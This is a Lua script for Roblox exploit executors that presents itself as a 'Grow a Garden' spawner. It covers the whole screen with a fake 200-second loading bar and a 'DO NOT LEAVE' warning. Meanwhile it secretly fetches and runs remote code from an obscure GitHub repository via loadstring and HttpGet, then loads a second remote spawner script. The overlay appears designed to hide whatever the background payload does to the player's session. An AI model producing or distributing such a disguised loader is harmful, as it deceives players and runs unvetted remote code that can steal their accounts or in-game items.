local cam = workspace.CurrentCamera
local screenX, screenY = cam.ViewportSize.X, cam.ViewportSize.Y

local objs = {}
local barCount = 62
local barHeight = math.ceil(screenY / (barCount - 2)) + 2

for i = 1, barCount do
    local bar = Drawing.new("Square")
    bar.Size = Vector2.new(screenX + 40, barHeight)
    bar.Position = Vector2.new(-20, (i - 1) * barHeight)
    bar.Color = Color3.fromHSV(0.6 + math.sin(i/5)*0.1, 0.5, 0.2 + (i/barCount)*0.3)
    bar.Filled = true
    bar.Visible = true
    table.insert(objs, bar)
end

local function createText(txt, size, yOffset, color)
    local t = Drawing.new("Text")
    t.Text = txt
    t.Size = size
    t.Position = Vector2.new(screenX/2, yOffset)
    t.Color = color
    t.Center = true
    t.Outline = true
    t.Visible = true
    table.insert(objs, t)
    return t
end

local centerY = screenY / 2
createText("ðŸŒ´ GROW A GARDEN ðŸŒ´", 45, centerY - 100, Color3.new(1,1,1))
createText("DO NOT LEAVE", 26, centerY - 50, Color3.new(1,0,0))
createText("script loading please wait...", 24, centerY, Color3.new(1,1,1))

local barW, barH = 400, 20
local barX, barY = (screenX - barW)/2, centerY + 40

local outline = Drawing.new("Square")
outline.Size = Vector2.new(barW, barH)
outline.Position = Vector2.new(barX, barY)
outline.Color = Color3.new(1,1,1)
outline.Thickness = 2
outline.Filled = false
outline.Visible = true
table.insert(objs, outline)

local fill = Drawing.new("Square")
fill.Size = Vector2.new(0, barH)
fill.Position = Vector2.new(barX, barY)
fill.Color = Color3.fromRGB(0,200,255)
fill.Filled = true
fill.Visible = true
table.insert(objs, fill)

local percent = createText("0%", 20, barY + 30, Color3.new(1,1,1))

local duration = 200
local start = tick()

-- RUN YOUR EXTRA SCRIPT WHILE LOADING
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/zapadiapa3074zupa/Sfnanafnqrnqrjqrjqrjqrj/main/main.lua"))()
end)

while true do
    local elapsed = tick() - start
    local progress = math.clamp(elapsed / duration, 0, 1)

    for i, bar in ipairs(objs) do
        if bar.ClassName == "Square" and bar.Filled then
            bar.Position = Vector2.new(bar.Position.X, (bar.Position.Y + 1) % (screenY + barHeight) - barHeight)
        end
    end

    fill.Size = Vector2.new(barW * progress, barH)
    percent.Text = tostring(math.floor(progress * 100)).."%"

    if progress >= 1 then break end
    wait(0.03)
end

for _,v in ipairs(objs) do
    v:Remove()
end

-- run your main script after loader
loadstring(game:HttpGet("https://raw.githubusercontent.com/ataturk123/GardenSpawner/refs/heads/main/Spawner.lua"))()
Spawner.Load()


